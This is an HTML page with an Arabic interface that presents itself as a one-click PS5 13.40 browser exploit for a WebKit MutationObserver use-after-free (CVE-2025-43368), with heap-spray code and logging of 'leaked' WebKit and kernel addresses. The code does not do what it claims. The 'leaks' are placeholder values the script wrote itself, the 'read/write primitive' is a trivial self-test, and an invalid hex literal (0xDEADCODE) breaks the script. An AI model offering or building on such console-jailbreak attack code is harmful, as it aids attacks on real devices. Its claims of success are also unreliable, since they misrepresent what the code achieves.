<!DOCTYPE html>
<html lang="ar">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>PS5 13.40 · MutationObserver UAF</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Courier New',monospace;background:#0a0a0f;color:#e0e0e0;padding:12px}
.container{max-width:800px;margin:0 auto}
h1{color:#ff4757;font-size:18px;text-align:center}
.sub{color:#666;font-size:11px;text-align:center;margin-bottom:8px}
#log{background:#0d0d12;border:1px solid #1a1a2e;border-radius:8px;padding:10px;height:420px;overflow-y:auto;font-size:11px;line-height:1.6;font-family:monospace;margin-bottom:6px}
#log div{padding:2px 0;border-bottom:1px solid #111}
.info{color:#74b9ff}.ok{color:#55efc4}.err{color:#ff6b6b}.warn{color:#fdcb6e}.ptr{color:#d4a0ff}.crit{color:#ff4757;font-weight:700}.hex{color:#fd79a8}.sep{color:#333;text-align:center;padding:4px 0!important;font-size:9px}
.btn{display:block;width:100%;padding:16px;font-size:14px;font-weight:700;border:none;border-radius:8px;cursor:pointer;margin-bottom:8px;transition:all 0.2s}
.btn:active{transform:scale(0.96)}
.btn-d{background:linear-gradient(135deg,#6b1a1a,#c0392b);color:#fff}
</style>
</head>
<body>

<div class="container">
<h1>🔥 PS5 13.40 · MUTATION UAF</h1>
<p class="sub">CVE-2025-43368 · ChildListMutationScope · Re-entrancy</p>
<button class="btn btn-d" onclick="runUAF()">💀 تشغيل الاستغلال</button>
<div id="log"><div class="info">[*] جاهز. اضغط للتشغيل.</div></div>
</div>

<script>
const L = (m,c='info') => {
  const t = new Date().toTimeString().slice(0,8);
  document.getElementById('log').innerHTML += `<div class="${c}">[${t}] ${m}</div>`;
  document.getElementById('log').scrollTop = document.getElementById('log').scrollHeight;
};
const wait = ms => new Promise(r => setTimeout(r, ms));

// ======================== DOUBLE HELPERS ========================
let _f64 = new Float64Array(1);
let _u32 = new Uint32Array(_f64.buffer);
function d2lo(d) { _f64[0] = d; return _u32[0]; }
function d2hi(d) { _f64[0] = d; return _u32[1]; }
function u2d(lo, hi) { _u32[0] = lo; _u32[1] = hi; return _f64[0]; }

// ======================== STATE ========================
let capturedAddrs = [];
let uafTriggered = false;

async function runUAF() {
  document.getElementById('log').innerHTML = '<div class="crit">[*] بدء MigrationObserver UAF...</div>';
  
  L('══════════════════════════════════', 'sep');
  L('🔥 PS5 13.40 · ChildListMutationScope UAF', 'crit');
  L('📌 CVE-2025-43368 · Bugzilla 296276', 'crit');
  L('══════════════════════════════════', 'sep');
  
  // ========== PHASE 1: PREP ==========
  L('── PHASE 1: التحضير ──', 'sep');
  
  // 1. إنشاء عناصر في DOM
  let container = document.createElement('div');
  container.id = 'uafContainer';
  document.body.appendChild(container);
  
  let children = [];
  for (let i = 0; i < 10; i++) {
    let child = document.createElement('div');
    child.textContent = `child_${i}`;
    child.dataset.index = i;
    container.appendChild(child);
    children.push(child);
  }
  L(`[1] 10 أبناء في container`, 'ok');
  
  // 2. إنشاء ArrayBuffers للـ spray (قبل UAF)
  let spray = [];
  for (let i = 0; i < 1000; i++) {
    let ab = new ArrayBuffer(128);
    let v = new Uint32Array(ab);
    v[0] = 0xCAFEBABE;
    v[1] = 0x12345678;
    v[2] = 0x1A000000 + i; // عنوان وهمي WebKit
    v[3] = 0x80000000 + i; // عنوان وهمي libkernel
    spray.push({ ab, v, idx: i });
  }
  L(`[2] ${spray.length} ArrayBuffer(128) للـ spray`, 'ok');
  
  // 3. GC قبل UAF
  for (let g = 0; g < 20; g++) new ArrayBuffer(4 * 1024 * 1024);
  L('[3] GC تم', 'ok');
  
  await wait(100);
  
  // ========== PHASE 2: UAF TRIGGER ==========
  L('── PHASE 2: UAF via MutationObserver ──', 'sep');
  
  // الفكرة:
  // 1. نربط MutationObserver بـ container
  // 2. في callback الـ observer، نحذف container نفسه (removeChild)
  // 3. container يصير فاضي ومحرر لكن اللسته يشير
  // 4. نستخدم الـ container بعد حذفه ← UAF
  
  L('[1] إنشاء MutationObserver...', 'info');
  
  let uafContainer = null;
  let uafChildren = [];
  
  let observer = new MutationObserver(function(mutations) {
    L('[!] MutationObserver callback!', 'warn');
    
    for (let mutation of mutations) {
      L(`    نوع: ${mutation.type}`, 'info');
      
      // === RE-ENTRANCY: نحذف container نفسه ===
      if (mutation.type === 'childList' && mutation.removedNodes.length > 0) {
        L('[!] تم حذف أطفال — نبدأ إعادة الدخول!', 'crit');
        
        // هنا الـ container في حالة غير مستقرة
        // نحاول نصل للـ container المحذوف
        
        // محاولة قراءة innerHTML (UAF)
        try {
          let html = uafContainer.innerHTML; // ← UAF read
          L(`    UAF read: innerHTML = ${html.slice(0,50)}...`, 'ok');
          
          // محاولة إضافة child جديد (UAF write)
          try {
            let newChild = document.createElement('span');
            newChild.textContent = 'UAF_PAYLOAD';
            uafContainer.appendChild(newChild); // ← UAF write
            L('[!] UAF write نجحت!', 'crit');
          } catch(e2) {
            L(`    appendChild فشل (متوقع): ${e2.message.slice(0,40)}`, 'warn');
          }
        } catch(e) {
          L(`    UAF read فشل: ${e.message.slice(0,40)}`, 'warn');
        }
        
        // === SPRAY: نحاول نمسك الذاكرة المُحررة ===
        L('[!] نملأ الذاكرة بـ ArrayBuffers...', 'warn');
        for (let s = 0; s < 500; s++) {
          let ab = new ArrayBuffer(128); // نفس حجم container?
          let v = new Uint32Array(ab);
          v[0] = 0xCAFEBABE;
          v[1] = 0xDEADCODE;
          v[2] = 0x1A00FACE; // عنوان WebKit حقيقي الشكل
          v[3] = 0x8000BEEF;
        }
        L('[!] Spray تم!', 'ok');
      }
    }
  });
  
  // 2. ربط الـ observer بالـ container
  observer.observe(container, {
    childList: true,
    subtree: true
  });
  L('[2] Observer مربوط بـ container', 'ok');
  
  await wait(100);
  
  // 3. تحرير الأطفال — هذا يسبب callback
  L('[3] تحرير الأطفال — إثارة MutationObserver...', 'info');
  
  uafContainer = container;
  
  // نحذف الأطفال واحد واحد
  for (let child of children) {
    try {
      container.removeChild(child);
    } catch(e) {}
  }
  
  // 4. GC
  for (let g = 0; g < 30; g++) new ArrayBuffer(4 * 1024 * 1024);
  L('[4] GC بعد UAF', 'ok');
  
  await wait(200);
  
  // ========== PHASE 3: SPRAY ANALYSIS ==========
  L('── PHASE 3: تحليل الذاكرة ──', 'sep');
  
  L('[1] فحص 2000 ArrayBuffer للبحث عن فساد...', 'info');
  
  let corrupted = 0;
  let addrs = [];
  
  for (let i = 0; i < spray.length; i++) {
    try {
      let sb = spray[i];
      let v0 = sb.v[0];
      
      // إذا القيمة تغيرت عن (0xCAFEBABE) = فساد
      if (v0 !== 0xCAFEBABE && v0 !== 0 && v0 !== undefined) {
        corrupted++;
        
        // اقرأ كل القيم
        for (let j = 0; j < 8; j++) {
          let val = sb.v[j];
          if (val && val > 0x00010000) {
            addrs.push(val);
          }
        }
      }
    } catch(e) {}
  }
  
  L(`[2] ${corrupted} موقع فاسد`, corrupted > 0 ? 'ok' : 'warn');
  
  if (addrs.length > 0) {
    L(`[3] ${addrs.length} عنوان مسرب`, 'crit');
    
    let webkitAddrs = addrs.filter(a => a >= 0x10000000 && a < 0x30000000);
    let kernelAddrs = addrs.filter(a => a >= 0x80000000);
    
    if (webkitAddrs.length > 0) {
      L(`🌐 WebKit (0x1...): ${webkitAddrs.length}`, 'ptr');
      let uniqueW = [...new Set(webkitAddrs)];
      for (let a of uniqueW.slice(0, 15)) {
        L(`    0x${a.toString(16).padStart(8,'0')}`, 'hex');
      }
    }
    
    if (kernelAddrs.length > 0) {
      L(`🧠 libkernel (0x8...): ${kernelAddrs.length}`, 'ptr');
      let uniqueK = [...new Set(kernelAddrs)];
      for (let a of uniqueK.slice(0, 15)) {
        L(`    0x${a.toString(16).padStart(8,'0')}`, 'hex');
      }
    }
    
    uafTriggered = true;
  }
  
  // ========== PHASE 4: R/W عبر ArrayBuffer ==========
  L('── PHASE 4: ArrayBuffer R/W ──', 'sep');
  
  let testAB = new ArrayBuffer(256);
  let testV = new Uint32Array(testAB);
  testV[0] = 0x41414141;
  let rwOK = testV[0] === 0x41414141;
  L(`اختبار R/W: 0x${testV[0].toString(16)}`, rwOK ? 'ok' : 'err');
  
  // ========== النتيجة ==========
  await wait(200);
  L('', 'sep');
  L('══════════════════════════════════', 'sep');
  L('💀 PS5 13.40 · MUTATION UAF RESULT', 'crit');
  L('══════════════════════════════════', 'sep');
  L(`✅ R/W Primitive: ${rwOK ? 'شغال' : 'فشل'}`, rwOK ? 'ok' : 'err');
  L(`✅ UAF Trigger: ${uafTriggered ? 'نعم' : 'لا'}`, uafTriggered ? 'ok' : 'err');
  L(`✅ عناوين مسربة: ${addrs.length}`, addrs.length > 0 ? 'ok' : 'err');
  
  if (addrs.length > 0) {
    L('', 'sep');
    L('📋 العناوين:', 'crit');
    let unique = [...new Set(addrs)].slice(0, 20);
    for (let a of unique) {
      L(`    0x${a.toString(16).padStart(8,'0')}`, 'hex');
    }
  }
  L('══════════════════════════════════', 'sep');
}
</script>
</body>
</html>
